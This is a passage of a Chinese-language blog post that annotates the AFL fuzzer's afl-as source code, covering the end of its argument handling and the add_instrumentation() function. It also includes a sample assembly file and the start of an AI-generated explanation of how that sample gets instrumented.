__APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;<span class="comment">//如果用的clang_as则添加-c -x assembler参数</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];<span class="comment">//将最后一个参数赋值给input_file</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;<span class="comment">//如果input_file是以-开头的</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;<span class="comment">//如果是-versiom则进入该分支</span></span><br><span class="line">      just_version = <span class="number">1</span>;<span class="comment">//设置just_version的值为1</span></span><br><span class="line">      modified_file = input_file;<span class="comment">//将modified_file赋值为-version</span></span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;<span class="comment">//跳转到参数组合结尾</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) FATAL(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);<span class="comment">//如果input_file不是-version则抛出异常</span></span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果首字母不是-</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//则比对input_file的前strlen(tmp_dir)、9、5个字符是否分别和tmp_dir、/var/tmp/、/tmp/相同，如果都不相同则将pass_thru设置为1</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified_file = alloc_printf(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, getpid(),</span><br><span class="line">                               (u32)time(<span class="literal">NULL</span>));<span class="comment">//设modified_file为类似的tmp_dir/.afl-pid-time.s格式的字符串</span></span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line"></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;<span class="comment">//接收modified_file的最后一个参数,[as, --64, -o, test.o, /tmp/.afl-pid-time.s]</span></span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;<span class="comment">//[as, --64, -o, test.o, /tmp/.afl-pid-time.s, NULL]</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation()"></a>add_instrumentation()</h3><p>这里根据gemini 2.5pro给出以下代码进行插桩，问题和插桩后的代码放在末尾了</p>
<p>源代码test.s ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.file	&quot;test.c&quot;</span><br><span class="line">	.intel_syntax noprefix</span><br><span class="line"># -- some intel syntax code here --</span><br><span class="line"># it should be skipped</span><br><span class="line">	.att_syntax</span><br><span class="line">	.text</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">	.cfi_startproc</span><br><span class="line">	endbr64</span><br><span class="line">	mov	DWORD PTR [rbp-4], edi</span><br><span class="line">	cmp	DWORD PTR [rbp-4], 10</span><br><span class="line">	jg	.L2</span><br><span class="line">#APP</span><br><span class="line">	# This is user&#x27;s inline assembly</span><br><span class="line">	# It should also be skipped</span><br><span class="line">#NO_APP</span><br><span class="line">	mov	eax, DWORD PTR [rbp-4]</span><br><span class="line">	add	eax, 1</span><br><span class="line">	jmp	.L3</span><br><span class="line">.L2:</span><br><span class="line">	mov	eax, DWORD PTR [rbp-4]</span><br><span class="line">	sub	eax, 1</span><br><span class="line">.L3:</span><br><span class="line">	nop</span><br><span class="line">	leave</span><br><span class="line">	.cfi_def_cfa 7, 8</span><br><span class="line">	ret</span><br><span class="line">	.cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.section	.rodata</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Hello&quot;</span><br><span class="line">	.ident	&quot;GCC: (Ubuntu 11.2.0-19ubuntu1) 11.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line">	.section	.note.gnu.property,&quot;a&quot;</span><br><span class="line">	.align 8</span><br><span class="line">	.long	 1f - 0f</span><br><span class="line">	.long	 4f - 1f</span><br><span class="line">	.long	 5</span><br><span class="line">0:</span><br><span class="line">	.string	 &quot;GNU&quot;</span><br><span class="line">1:</span><br><span class="line">	.word	0</span><br><span class="line">	.long	0</span><br><span class="line">	.long	0</span><br><span class="line">4:</span><br></pre></td></tr></table></figure>

<p><strong>源代码注释</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process input file, generate modified_file. Insert instrumentation in all</span></span><br><span class="line"><span class="comment">   the appropriate places. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> &#123;<span class="comment">//处理输入文件，生成modified_file，将桩插入所有适当的位置</span></span><br><span class="line"><span class="comment">/*-------------------初始化-------------------------*/</span></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;<span class="comment">//定义一些flag变量（默认值）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;<span class="comment">//如果存在输入的文件名称</span></span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);<span class="comment">//尝试打开input_file文件</span></span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<span class="comment">//如果打开失败则抛出异常</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;<span class="comment">//如果input_file不存在则将inf设置为标准输入</span></span><br><span class="line"></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);<span class="comment">//以写的方式打开modified_file，如果文件已存在就直接打开，如果没有就创建一个</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);<span class="comment">//如果没有写的权限则抛出异常</span></span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);<span class="comment">//尝试打开</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);<span class="comment">//打不开抛出异常  </span></span><br><span class="line"><span class="comment">/*------------------------插桩核心代码-----------------------------*/</span></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;<span class="comment">//循环读取inf指向的文件的每一行到line数组中，每行最多MAX_LINE(8192 bytes)，这个值包括’\0’,所以实际读取的有内容的字节数是MAX_LINE-1个字节。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;<span class="comment">//236行的flag变量默认为0</span></span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;<span class="comment">//根据下面的判断，是否为defered mode（延迟模式）即第一次肯定是不能执行这个if的，但是经过后文的处理下一轮循环可以进行插桩</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));<span class="comment">//插桩</span></span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;<span class="comment">//instrument_next重置为0，也可以理解为下一轮插桩</span></span><br><span class="line">      ins_lines++;<span class="comment">//插桩计数器加1</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;<span class="comment">//如果 pass_thru 标志被设置，意味着 afl-as 认为这个文件不应该被插桩。它会立即 continue，变成一个纯粹的文件复制程序</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line">       <span class="comment">//首先我们只想对.text段进行插桩，所以我们需要跟踪处理过的文件，并相应地设置instr_ok。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line">         <span class="comment">//OpenBSD将跳转表直接内联到代码中，这有点烦人。他们在跳转表周围使用特定格式的p2align指令，因此我们将其用作信号。</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;<span class="comment">//检查是否为p2align指令，如果是则将skip_next_label设置为1</span></span><br><span class="line">          <span class="comment">//instr_ok是一个flag变量，如果当前在.text段中则为1，否则为0</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;<span class="comment">// 找到了text段，授予插桩许可</span></span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">//匹配&quot;text\n&quot;、&quot;section\t.text&quot;、&quot;section\t__TEXT,__text&quot;、&quot;section __TEXT,__text&quot;中的任意一个则将instr_ok设置为1，表示当前在.text段中</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;<span class="comment">// 离开了代码段，撤销插桩许可</span></span><br><span class="line">        <span class="keyword">continue</span>;<span class="comment">//匹配&quot;section\t&quot;、&quot;section &quot;、&quot;bss\n&quot;、&quot;data\n&quot;中的任意一个如果成功则将instr_ok设置为0，表示当前不在.text段中</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;<span class="comment">//判断架构</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;<span class="comment">//判断是否为intel语法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;<span class="comment">//判断是否为att语法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;<span class="comment">//_ad_hoc __asm__ 块是否跳过</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;<span class="comment">//进入用户内敛汇编块</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;<span class="comment">//离开</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch: 插装时终端关注对象</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented); main函数</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label; gcc下的分支标记</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode);clang下的分支标记</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches; 条件跳转分支标记</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*------------------------------插桩策略--------------------------------------*/</span></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line">       <span class="comment">//条件转移指令jnz等。我们在分支后面附加插桩（以检测未采用的路径）和分支目标标签（稍后处理）。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">/*这段代码专门处理以制表符开头的指令。它识别所有条件跳转指令（j开头但不是jmp），并根据 inst_ratio（插桩率）进行概率判断。</span></span><br><span class="line"><span class="comment">        如果决定插桩，它会立刻调用 fprintf 将 trampoline（桩代码模板）写入输出文件*/</span></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;<span class="comment">//对于行如\tj[^m].格式的指令，即条件跳转指令,且R()函数创建的随机数小于插桩密度inst_ratio</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));<span class="comment">//判断是否为64位程序，使用fprintf函数将桩插在outf指向的文件的\n\tj[^m].指令位置，插入R()函数创建的小于MAP_SIZE的随机数</span></span><br><span class="line"></span><br><span class="line">        ins_lines++;<span class="comment">//插桩计数器加1,跳出循环进行下一次遍历</span></span><br><span class="line"></span><br><span class="line">      &#125;<span class="comment">//这里直接进行了插桩，并没有将instrument_next设置为1，因为条件跳转指令本身就有两个分支路径，插桩在这里已经覆盖了未采取路径</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;<span class="comment">//检查line中是否存在:</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;<span class="comment">//检查是否以L开头并且:前面是数字</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;<span class="comment">//当代码识别出一个标签（以 : 结尾）时，它知道这是一个基本块的入口，是理想的插桩点</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;<span class="comment">//检查是否以.开头</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;<span class="comment">//检查是否以L开头并且后面是数字，或者是clang模式并且以LBB开头，且R()函数创建的随机数小于插桩密度inst_ratio</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;<span class="comment">//检查是否以.L开头并且后面是数字，或者是clang模式并且以.LBB开头，且R()函数创建的随机数小于插桩密度inst_ratio</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;<span class="comment">//设置instrument_next为1,在下一轮循环开头插桩</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line">        <span class="comment">//不立即插桩，而是设置“预约”标志————即在下一次循环开头</span></span><br><span class="line">        instrument_next = <span class="number">1</span>;<span class="comment">//否则代表这是一个function label,插桩^func，设置instrument_next为1（defered mode）</span></span><br><span class="line">        <span class="comment">//但它不立即行动，而是将 instrument_next 标志设为 1。真正的 fprintf 操作被推迟到下一次循环的开始，并且只有当下一行是真正的指令时（以\t和字母开头）才会执行。</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*-------------------------------收尾--------------------------------------*/</span></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)<span class="comment">//如果插桩计数器不为零</span></span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);<span class="comment">//向outf指向的文件中写入main_payload_64或者main_payload_32</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);<span class="comment">//关闭文件</span></span><br><span class="line">  fclose(outf);<span class="comment">//关闭文件</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;<span class="comment">//如果使用的不是静默模式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,<span class="comment">//如果插桩计数器为空，抛出异常</span></span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,<span class="comment">//插桩成功输出</span></span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>好的，看看 <code>add_instrumentation</code> 函数会如何处理你提供的那段汇编代码。</p>
<p>下面是针对每一个“考点”的详细答案，以及最终生成的 <code>modified_file</code> 的内容。</p>
<hr>
<h3 id="“考点”答案详解"><a href="#“考点”答案详解" class="headerlink" title="“考点”答案详解"></a>“考点”答案详解</h3><h4 id="1-段落切换"><a href="#1-段落切换" class="headerlink" title="1. 段落切换"></a>1. 段落切换</h4><ul>
<li><strong>问题</strong>：代码如何通过 <code>.text</code> 将 <code>instr_ok</code> 设置为 <code>1</code>？</li>
<li><strong>答案</strong>：当循环读到 <code>\t.text\n</code> 这一行时，<code>if (line[0] == &#39;\t&#39; &amp;&amp; line[1] == &#39;.&#39;)</code> 条件成立。内部的 <code>if (!strncmp(line + 2, &quot;text\n&quot;, 5))</code> 也成立，因此 <code>instr_ok</code> 被设置为 <code>1</code>。</li>
<li><strong>问题</strong>：代码如何通过 <code>.section .rodata</code> 将 <code>instr_ok</code> 重新设置为 <code>0</code>？</li>
<li><strong>答案</strong>：当读到 <code>\t.section\t.rodata</code> 这一行时，<code>if (line[0] == &#39;\t&#39; &amp;&amp; line[1] == &#39;.&#39;)</code> 条件成立。内部的 <code>if (!strncmp(line + 2, &quot;section\t&quot;, 8) ...)</code> 成立，因此 <code>instr_ok</code> 被设置为 <code>0</code>，后续所有行都不会再被插桩。</li>
</ul>
<h4 id="2-特殊语法块跳过"><a href="#2-特殊语法块跳过" class="headerlink" title="2. 特殊语法块跳过"></a>2. 特殊语法块跳过</h4><ul>
<li><strong>问题</strong>：<code>skip_intel</code> 标志是如何因为 <code>.intel_syntax</code> 和 <code>.att_syntax</code> 而变化的？</li>
